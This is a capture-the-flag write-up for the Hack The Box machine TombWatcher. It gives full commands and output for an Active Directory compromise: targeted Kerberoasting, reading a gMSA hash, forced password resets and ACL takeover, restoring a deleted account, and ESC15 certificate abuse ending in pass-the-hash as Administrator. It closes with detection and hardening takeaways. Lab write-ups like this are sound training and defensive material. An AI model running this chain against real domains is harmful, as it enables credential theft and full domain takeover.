# HTB Write-Up: TombWatcher

| Field      | Details                                                                  |
|------------|--------------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/TombWatcher)          |
| Difficulty | Medium                                                                   |
| OS         | Windows                                                                  |
| Author     | Landau                                                                   |
| Date       | June 14, 2026                                                            |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — BloodHound & ACL Analysis](#2-enumeration--bloodhound--acl-analysis)
3. [Lateral Movement — Targeted Kerberoasting & gMSA Abuse](#3-lateral-movement--targeted-kerberoasting--gmsa-abuse)
4. [Lateral Movement — ForceChangePassword & WriteOwner Chain](#4-lateral-movement--forcechangepassword--writeowner-chain)
5. [Privilege Escalation — ADCS Recycle Bin & ESC15](#5-privilege-escalation--adcs-recycle-bin--esc15)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery, followed by **Nmap** for service and version fingerprinting:

```bash
rustscan -a 10.129.232.167 --ulimit 5000
nmap -A 10.129.232.167
```

**Open Ports:**

| Port  | Service    | Details                                        |
|-------|------------|------------------------------------------------|
| 53    | DNS        | Simple DNS Plus                                |
| 80    | HTTP       | Microsoft IIS httpd 10.0                       |
| 88    | Kerberos   | Microsoft Windows Kerberos                     |
| 135   | MSRPC      | Microsoft Windows RPC                          |
| 139   | NetBIOS    | Microsoft Windows netbios-ssn                  |
| 389   | LDAP       | Domain: `tombwatcher.htb`                      |
| 445   | SMB        | microsoft-ds                                   |
| 464   | kpasswd5   | tcpwrapped                                     |
| 593   | HTTP-RPC   | RPC over HTTP 1.0                              |
| 636   | LDAPS      | Active Directory LDAP over SSL                 |
| 5985  | WinRM      | Microsoft HTTPAPI httpd 2.0                    |

The host is a **Domain Controller** running **Windows Server 2019**, domain: **`tombwatcher.htb`**, hostname: **`DC01`**.

The machine was provided with a set of starting credentials: **`henry:H3nry_987TGV!`**.

---

## 2. Enumeration — BloodHound & ACL Analysis

### 2.1 — SMB Share Enumeration

SMB share access was verified with the provided credentials:

```bash
netexec smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --shares
```

**Output:**

```
SMB  10.129.232.167  445  DC01  [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB  10.129.232.167  445  DC01  Share      Permissions   Remark
SMB  10.129.232.167  445  DC01  -----      -----------   ------
SMB  10.129.232.167  445  DC01  ADMIN$                   Remote Admin
SMB  10.129.232.167  445  DC01  C$                       Default share
SMB  10.129.232.167  445  DC01  IPC$       READ          Remote IPC
SMB  10.129.232.167  445  DC01  NETLOGON   READ          Logon server share
SMB  10.129.232.167  445  DC01  SYSVOL     READ          Logon server share
```

No non-standard shares were readable. Focus shifted to domain enumeration.

### 2.2 — BloodHound Collection

BloodHound was used to map the full ACL graph of the domain. The clock skew was corrected first to ensure Kerberos authentication worked:

```bash
sudo ntpdate 10.129.232.167
bloodhound-python -u henry -p 'H3nry_987TGV!' -ns 10.129.232.167 \
  --zip -c All -d tombwatcher.htb
```

**Key findings from BloodHound:**

- **`henry`** has **WriteSPN** over **`alfred`** — enables targeted Kerberoasting.
- **`alfred`** has **AddSelf** over the **`INFRASTRUCTURE`** group — can add himself to the group.
- **`INFRASTRUCTURE`** group has **ReadGMSAPassword** over **`ANSIBLE_DEV$`** — a Group Managed Service Account.
- **`ANSIBLE_DEV$`** has **ForceChangePassword** over **`sam`**.
- **`sam`** has **WriteOwner** over **`john`**.
- **`john`** has **GenericAll** over the **`ADCS`** OU — which contains a deleted `cert_admin` user in the AD Recycle Bin.
- The **WebServer** certificate template grants enrollment rights to the `cert_admin` SID and is vulnerable to **ESC15 (CVE-2024-49019)**.

This is a multi-hop ACL chain:
```
henry → alfred → INFRASTRUCTURE → ANSIBLE_DEV$ → sam → john → cert_admin → ESC15 → Administrator
```

---

## 3. Lateral Movement — Targeted Kerberoasting & gMSA Abuse

### 3.1 — Targeted Kerberoast: Henry → Alfred

**`henry`** holds **WriteSPN** over **`alfred`**, meaning he can write a fake Service Principal Name onto alfred's account, making it Kerberoastable. A fake SPN was set using `bloodyAD`:

```bash
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u henry -p 'H3nry_987TGV!' \
  set object alfred servicePrincipalName -v 'fake/blah'
```

The TGS-REP hash was then requested with `impacket-GetUserSPNs`:

```bash
impacket-GetUserSPNs TOMBWATCHER.HTB/henry:'H3nry_987TGV!' \
  -dc-ip 10.129.232.167 \
  -request-user alfred \
  -outputfile alfred.hash
```

The hash was cracked offline with Hashcat:

```bash
hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
basketball
```

The SPN was cleaned up after cracking:

```bash
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u henry -p 'H3nry_987TGV!' \
  set object alfred servicePrincipalName -v ''
```

Credentials recovered:

| Account                  | Password     |
|--------------------------|--------------|
| `tombwatcher.htb\alfred` | `basketball` |

### 3.2 — AddSelf: Alfred → INFRASTRUCTURE Group

**`alfred`** has **AddSelf** rights on the `INFRASTRUCTURE` group, allowing him to add himself as a member:

```bash
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u alfred -p 'basketball' \
  add groupMember INFRASTRUCTURE alfred
```

### 3.3 — ReadGMSAPassword: INFRASTRUCTURE → ANSIBLE_DEV$

As a member of `INFRASTRUCTURE`, alfred can now read the managed password of the **`ANSIBLE_DEV$`** gMSA account. gMSA passwords are 128 random bytes — uncrackable — but the NT hash can be read directly from LDAP:

```bash
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u alfred -p 'basketball' \
  get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
```

**Output:**

```
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b91f529d36292ba764273e5dd7b90fa1
```

The NT hash `b91f529d36292ba764273e5dd7b90fa1` was used directly via Pass-the-Hash for all subsequent operations as `ANSIBLE_DEV$`.

---

## 4. Lateral Movement — ForceChangePassword & WriteOwner Chain

### 4.1 — ForceChangePassword: ANSIBLE_DEV$ → Sam

**`ANSIBLE_DEV$`** has **ForceChangePassword** over **`sam`**. The password was reset using the gMSA NT hash:

```bash
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u 'ANSIBLE_DEV$' -p ':b91f529d36292ba764273e5dd7b90fa1' \
  set password sam 'Admin123!'
```

### 4.2 — WriteOwner + GenericAll: Sam → John

**`sam`** has **WriteOwner** over **`john`**. Ownership was transferred to sam, then a FullControl ACE was added, enabling a password reset:

```bash
# Take ownership
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u sam -p 'Admin123!' \
  set owner john sam

# Grant GenericAll
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u sam -p 'Admin123!' \
  add genericAll john sam

# Reset john's password
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u sam -p 'Admin123!' \
  set password john 'Admin123!'
```

A WinRM shell was obtained as john:

```bash
evil-winrm -i 10.129.232.167 -u john -p 'Admin123!'
```

**User flag retrieved from `\john\Desktop\user.txt`.**

---

## 5. Privilege Escalation — ADCS Recycle Bin & ESC15

### 5.1 — GenericAll on ADCS OU & Certificate Enumeration

BloodHound showed **`john`** has **GenericAll** over the **`ADCS`** OU. Certipy was run to enumerate certificate templates:

```bash
certipy find -u john@tombwatcher.htb -p 'Admin123!' \
  -dc-ip 10.129.232.167 -stdout
```

The **WebServer** template stood out with an unresolved SID in its enrollment rights:

```
Enrollment Rights : TOMBWATCHER.HTB\Domain Admins
                    TOMBWATCHER.HTB\Enterprise Admins
                    S-1-5-21-1392491010-1358638721-2126982587-1111
```

This SID could not be resolved — indicating a deleted or orphaned account.

### 5.2 — AD Recycle Bin: Discovering cert_admin

From an Evil-WinRM shell as john, deleted objects were enumerated:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects \
  -Properties cn,objectSid,isDeleted | Where-Object { $_.isDeleted -eq $true }
```

Three deleted versions of a `cert_admin` user were found. The one matching SID `...1111` had GUID `938182c3-bf0b-410a-9aaa-45c8e1a02ebf` and critically, its `lastKnownParent` was the **`ADCS` OU** — the same OU john has GenericAll over. This means restoring it would place it back under john's control.

### 5.3 — Restore cert_admin from Recycle Bin

The deleted object was restored via PowerShell (requires WinRM):

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

### 5.4 — Propagate GenericAll to cert_admin

With `cert_admin` now restored into the ADCS OU, john's GenericAll was pushed down as an inherited ACE to all child objects using `impacket-dacledit`:

```bash
impacket-dacledit TOMBWATCHER.HTB/john:'Admin123!' \
  -dc-ip 10.129.232.167 \
  -action write -rights FullControl \
  -inheritance -principal john \
  -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb'
```

### 5.5 — Reset cert_admin Password

```bash
bloodyAD --host 10.129.232.167 -d TOMBWATCHER.HTB \
  -u john -p 'Admin123!' \
  set password cert_admin 'Pwned123!'
```

### 5.6 — ESC15: Exploiting CVE-2024-49019

Certipy confirmed the WebServer template is vulnerable to **ESC15**:

```
Template Name     : WebServer
Schema Version    : 1               ← no Application Policy enforcement
Enrollee Supplies Subject : True    ← attacker controls cert content
Extended Key Usage: Server Authentication
Vulnerabilities   : ESC15
Enrollment Rights : TOMBWATCHER.HTB\cert_admin
```

**Schema Version 1** templates predate Application Policy constraints, meaning an attacker can inject any EKU into the certificate request. By injecting the **Enrollment Agent OID** (`1.3.6.1.4.1.311.20.2.1`), the resulting certificate can be used to request certificates on behalf of any domain user.

**Step 1 — Request Enrollment Agent certificate:**

```bash
certipy req -ca 'tombwatcher-CA-1' \
  -u cert_admin@tombwatcher.htb -p 'Pwned123!' \
  -dc-ip 10.129.232.167 -target-ip 10.129.232.167 \
  -template WebServer \
  -application-policies '1.3.6.1.4.1.311.20.2.1'
```

This produced `cert_admin.pfx` — now functioning as an Enrollment Agent certificate.

**Step 2 — Request Administrator certificate on-behalf-of:**

```bash
certipy req -ca 'tombwatcher-CA-1' \
  -u cert_admin@tombwatcher.htb -p 'Pwned123!' \
  -dc-ip 10.129.232.167 -target-ip 10.129.232.167 \
  -template User \
  -on-behalf-of 'tombwatcher\administrator' \
  -pfx cert_admin.pfx
```

**Step 3 — Authenticate via PKINIT and recover NT hash:**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167
```

**Output:**

```
[*] Using principal: administrator@tombwatcher.htb
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:<HASH>
```

### 5.7 — Root Flag via Pass-the-Hash

```bash
evil-winrm -i 10.129.232.167 -u administrator -H '<HASH>'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<root flag>
```

**Root flag retrieved from `\Administrator\Desktop\root.txt`.**

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap | DC identified, `tombwatcher.htb`, Windows Server 2019 |
| Enumeration | BloodHound + bloodhound-python | Full ACL chain mapped across 7 hops |
| Kerberoast | WriteSPN abuse → `impacket-GetUserSPNs` → Hashcat | `alfred:basketball` recovered |
| Group Abuse | AddSelf → bloodyAD | `alfred` added to `INFRASTRUCTURE` group |
| gMSA | ReadGMSAPassword → bloodyAD | `ANSIBLE_DEV$` NT hash recovered (PtH) |
| ForceChange | ForceChangePassword → bloodyAD | `sam` password reset |
| WriteOwner | WriteOwner → GenericAll → bloodyAD | `john` password reset; WinRM shell |
| User Flag | Evil-WinRM as `john` | `user.txt` from `\john\Desktop` |
| Recycle Bin | Restore-ADObject (PowerShell) | `cert_admin` restored to ADCS OU |
| DACL Write | impacket-dacledit inheritance | GenericAll propagated to `cert_admin` |
| ESC15 | CVE-2024-49019 — Schema v1 EKU injection | Enrollment Agent cert obtained |
| Impersonation | certipy on-behalf-of Administrator | `administrator.pfx` obtained |
| PKINIT | certipy auth | Administrator NT hash recovered |
| Root | Evil-WinRM + Pass-the-Hash | `root.txt` from `\Administrator\Desktop` |

### Key Takeaways

- **WriteSPN is a stealthy Kerberoast primitive.** Unlike traditional Kerberoasting which targets existing service accounts, WriteSPN lets an attacker designate any user as a Kerberoast target. Monitoring for unexpected `msDS-ServicePrincipalName` modifications in AD is essential for detection.

- **gMSA passwords cannot be cracked — but that doesn't mean they're safe.** The NT hash of `ANSIBLE_DEV$` was readable directly from LDAP by any member of the `INFRASTRUCTURE` group. Group membership controlling gMSA read access must be tightly restricted and audited.

- **The AD Recycle Bin preserves ACL permissions on deleted objects.** When `cert_admin` was deleted, its enrollment rights on the WebServer template were not removed. Restoring the object from the Recycle Bin reactivated those rights. Deleted objects should be reviewed for lingering high-value ACL entries before restoration, and certificate template permissions should be audited independently of user account status.

- **ESC15 (CVE-2024-49019) affects all Schema Version 1 templates where the enrollee supplies the subject.** Because Schema Version 1 predates Application Policy enforcement, an attacker can inject any EKU — including Enrollment Agent — into a certificate request, effectively turning a harmless Server Authentication template into a full domain compromise primitive. Organizations should audit all Schema Version 1 templates and apply the patch for CVE-2024-49019.

- **GenericAll on an OU is transitive through child object restoration.** John's GenericAll on the ADCS OU alone wasn't immediately useful on an empty OU — but combined with the ability to restore a deleted object whose `lastKnownParent` was that OU, it became the key to controlling `cert_admin`. OU-level permissions must be treated with the same sensitivity as object-level permissions.
